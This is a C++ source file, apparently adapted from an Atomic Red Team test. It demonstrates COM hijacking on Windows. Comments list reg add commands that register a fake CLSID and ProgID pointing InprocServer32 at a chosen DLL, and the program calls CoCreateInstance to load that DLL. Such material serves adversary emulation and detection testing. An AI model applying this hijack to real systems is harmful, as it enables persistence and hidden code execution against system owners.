#include <iostream>
#include <WbemCli.h>
#include "Rpc.h"

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "Ws2_32.lib")

// Mod from Atomic red team test
// For ProgID Test
// reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\COM_Hijack_CPP" /ve /T REG_SZ /d "COM_Hijack_CPP" /f
// reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
// reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" / f
// reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /T REG_SZ /d "COM_Hijack_CPP" /f
// reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve / T REG_SZ /d "PATH_TO_YOUR_DLL" /f
// reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /T REG_SZ /d "Apartment" /f
// reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID" /ve /T REG_SZ / d "COM_Hijack_CPP" /f
// reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID" /ve /T REG_SZ /d "COM_Hijack_CPP" /f

// For CLSID Test
// reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /T REG_SZ /d "COM_Hijack_CPP" /f
// reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /T REG_SZ /d "PATH_TO_YOUR_DLL" /f
// reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /T REG_SZ /d "Apartment" /f

int wmain(int argc, wchar_t* argv[])
{
	if (argc != 3) {
		printf("Usage: com_hijack_progid_clsid.exe <Input Type (progid=ProgID/clsid=CLSID)> <ProgID/CLSID>");
		return 0;
	}

	WCHAR wcProgID[MAX_PATH + 1];
	HRESULT hr;
	CLSID clsid;
	UUID newIID;
	RPC_STATUS rpc_status;
	LPVOID null_ppv = NULL;

	if (FAILED(CoInitializeEx(0, COINIT_MULTITHREADED))) {
		printf("Failed at CoInitializeEx\n");
		return 0;
	}

	if (wcscmp(argv[1], L"progid") == 0) {
		wcscpy_s(wcProgID, argv[2]);
		wcProgID[wcslen(wcProgID) + 1] = '\0';
		if (FAILED(CLSIDFromProgID(wcProgID, &clsid))) {
			printf("Failed at CLSIDFromProgID\n");
			return 0;
		}

	} else if (wcscmp(argv[1], L"clsid") == 0) {
		const wchar_t* clsid_str = argv[2];
		if (FAILED(CLSIDFromString(clsid_str, &clsid))) {
			printf("Failed at CLSIDFromProgID\n");
			return 0;
		}
	}

	if (UuidCreate(&newIID) != RPC_S_OK) {
		printf("Failed to create UUID\n");
	}

	// You can change with CLSCTX_LOCAL_SERVER too that support .exe file
	// Ref: https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx
	if (FAILED(CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, newIID, (LPVOID*)&null_ppv))) {
		// It will always fail here since it is a incomplete clsid object without any connection with the IID (I guess so)
		// printf("Failed at CoCreateInstance\n");
		DWORD dwDummy;
	}
	CoUninitialize();

	return 0;
}